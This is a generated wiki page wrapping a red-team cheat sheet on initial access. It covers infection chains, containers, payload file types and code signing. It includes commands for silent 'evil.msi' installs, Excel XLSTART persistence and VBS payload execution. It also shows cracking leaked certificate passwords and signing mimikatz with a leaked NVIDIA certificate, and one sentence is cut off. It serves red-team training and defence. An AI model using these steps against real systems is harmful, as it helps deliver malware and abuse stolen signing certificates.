---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Initial Access

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-initial-access` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/initial-access.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Initial Access](../../topics/redteam/initial-access.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-access-initial-access |
| name | Initial Access |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/initial-access.md |

## Preserved Source Material

````yaml
_body: "# Initial Access\n\n> Initial Access Files in the context of a Red Team exercise refer to the set of files, scripts,\
  \ executables, or documents used by the Red Team to initially infiltrate the target system or network. These files often\
  \ contain malicious payloads or are designed to exploit specific vulnerabilities in order to establish a foothold in the\
  \ target environment.\n\n## Summary\n\n* [Complex Chains](#complex-chains)\n* [Container](#container)\n* [Payload](#payload)\n\
  \    * [Binary Files](#binary-files)\n    * [Code Execution Files](#code-execution-files)\n    * [Embedded Files](#embedded-files)\n\
  * [Code Signing](#code-signing)\n\n## Complex Chains\n\n> DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))\n\n* **DELIVERY**:\
  \ means to deliver a pack full of files\n    * HTML Smuggling, SVG Smuggling, Attachments\n* **CONTAINER**: archive bundling\
  \ all infection dependencies\n    * ISO/IMG, ZIP, WIM\n* **TRIGGER**: some way to run the payload\n    * LNK, CHM, ClickOnce\
  \ applications\n* **PAYLOAD**: the malware\n    * Binary Files\n    * Code Execution Files\n    * Embedded Files\n* **DECOY**:\
  \ used to continue pretext narration after detonating malware\n    * Typically open PDF files\n\nExamples:\n\n* HTML SMUGGLING(PASSWORD\
  \ PROTECTED ZIP + ISO(LNK + IcedID  + PNG)) used by [TA551/Storm-0303](https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/)\n\
  \n## Container\n\n* **ISO/IMG** - can contain hidden files, gets **automounted** giving easy access to contained files (`powershell\
  \ –c .\\malware.exe`)\n* **ZIP** - can contain hidden files (locate ZIP + unpack it + change dir + run Malware)\n* **WIM**\
  \ - Windows Image, builtin format used to deploy system features\n\n    ```ps1\n    # Mount/Unmount .WIM\n    PS> Mount-WindowsImage\
  \ -ImagePath myarchive.wim -Path \"C:\\output\\path\\to\\extract\" -Index 1\n    PS> Dismount-WindowsImage -Path \"C:\\\
  output\\path\\to\\extract\" -Discard\n    ```\n\n* **7-zip, RAR, GZ** - should get a native support on Windows 11\n\n##\
  \ Trigger\n\n* **LNK**\n* **CHM**\n* **ClickOnce**\n\n## Payload\n\n### Binary Files\n\nThese files can be executed directly\
  \ on the system without any third party.\n\n* **.exe** file, executable file can be run with a click\n* **.dll** file, execute\
  \ with `rundll32 main.dll,DllMain`\n\n    ```c\n    #define WIN32_LEAN_AND_MEAN\n    #include <windows.h>\n\n    extern\
  \ \"C\" __declspec(dllexport)\n    DWORD WINAPI MessageBoxThread(LPVOID lpParam) {\n    MessageBox(NULL, \"Hello world!\"\
  , \"Hello World!\", NULL);\n    return 0;\n    }\n\n    extern \"C\" __declspec(dllexport)\n    BOOL APIENTRY DllMain(HMODULE\
  \ hModule,\n                        DWORD ul_reason_for_call,\n                        LPVOID lpReserved) {\n    switch\
  \ (ul_reason_for_call) {\n        case DLL_PROCESS_ATTACH:\n        CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL,\
  \ NULL);\n        break;\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n        case DLL_PROCESS_DETACH:\n\
  \        break;\n    }\n    return TRUE;\n    }\n    ```\n\n* **.cpl** file, same as a .dll file with Cplapplet export\n\
  \n    ```c\n    #include \"stdafx.h\"\n    #include <Windows.h>\n\n    extern \"C\" __declspec(dllexport) LONG Cplapplet(\n\
  \        HWND hwndCpl,\n        UINT msg,\n        LPARAM lParam1,\n        LPARAM lParam2\n    )\n    {\n        MessageBoxA(NULL,\
  \ \"Hey there, I am now your control panel item you know.\", \"Control Panel\", 0);\n        return 1;\n    }\n\n    BOOL\
  \ APIENTRY DllMain( HMODULE hModule,\n                        DWORD  ul_reason_for_call,\n                        LPVOID\
  \ lpReserved\n                        )\n    {\n        switch (ul_reason_for_call)\n        {\n        case DLL_PROCESS_ATTACH:\n\
  \        {\n            Cplapplet(NULL, NULL, NULL, NULL);\n        }\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n\
  \        case DLL_PROCESS_DETACH:\n            break;\n        }\n        return TRUE;\n    }\n    ```\n\n### Code Execution\
  \ Files\n\n* Word with Macro (.doc, .docm)\n* Excel library (.xll)\n* Excel macro-enabled add-in file (.xlam)\n\n    ```ps1\n\
  \    xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\\Microsoft\\Excel\\XLSTART\n    ```\n\n* WSF files (.wsf)\n* MSI installers\
  \ (.msi)\n\n    ```ps1\n    powershell Unblock-File evil.msi; msiexec /q /i .\\evil.msi \n    ```\n\n* MSIX/APPX app package\
  \ (.msix, .appx)\n* ClickOnce (.application, .vsto, .appref-ms)\n* Powershell scripts (.ps1)\n* Windows Script Host scripts\
  \ (.wsh, .vbs)\n\n    ```ps1\n    cscript.exe payload.vbs\n    wscript payload.vbs\n    wscript /e:VBScript payload.txt\n\
  \    ```\n\n### Embedded Files\n\n* ICS Calendar Invites with Embedded Files\n\n## Code Signing\n\nCertificate can be **Expired**,\
  \ **Revoked**, **Valid**.\n\nMany certificates leaked on the Internet and got re-used by Threat Actor.\nSome of them can\
  \ be found on VirusTotal, with the query :  `content:{02 01 03 30}@4 AND NOT tag:peexe`\n\nIn 2022, LAPSUS$ claimed responsibility\
  \ for a cyberattack on NVIDIA, a major graphics card and AI technology manufacturer. As part of this attack, LAPSUS$ allegedly\
  \ stole proprietary data from NVIDIA and threatened to leak it. The leak contained\n\n* Certificates can be password protected.\
  \ Use [pfx2john.py](https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba)\n\n    ```ps1\n    john --wordlist=/opt/wordlists/rockyou.txt\
  \ --format=pfx pfx.hashes\n    ```\n\n* Sign a binary with a certificate.\n\n    ```ps1\n    osslsigncode sign -pkcs12 certs/nvidia-2014.pfx\
  \ -in mimikatz.exe -out generated/signed-mimikatz.exe -pass nv1d1aRules\n    ```\n\n* The following files can be signed\
  \ with a certificate\n    * executables: .exe, .dll, .ocx, .xll, .wll\n    * scripts: .vbs, .js, .ps1\n    * installers:\
  \ .msi, .msix, .appx, .msixbundle, .appxbundle\n    * drivers: .sys\n    * cabinets: .cab\n    * ClickOnce: .application,\
  \ .manifest, .vsto\n\n## References\n\n* [Top 10 Payloads: Highlighting Notable and Trending Techniques - delivr.to](https://blog.delivr.to/delivr-tos-top-10-payloads-highlighting-notable-and-trending-techniques-fb5e9fdd9356)\n\
  * [Executing Code as a Control Panel Item through an Exported Cplapplet Function - @spotheplanet](https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function)\n\
  * [Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach - x33fcon Youtube](https://youtu.be/CwNPP_Xfrts)\n\
  * [Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach - x33fcon PDF](https://binary-offensive.com/files/x33fcon%20-%20Desperate%20Infection%20Chains.pdf)\n\
  * [Red Macros Factory - https://binary-offensive.com/](https://binary-offensive.com/initial-access-framework)"
_relative_path: redteam/access/initial-access.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/initial-access.md
````
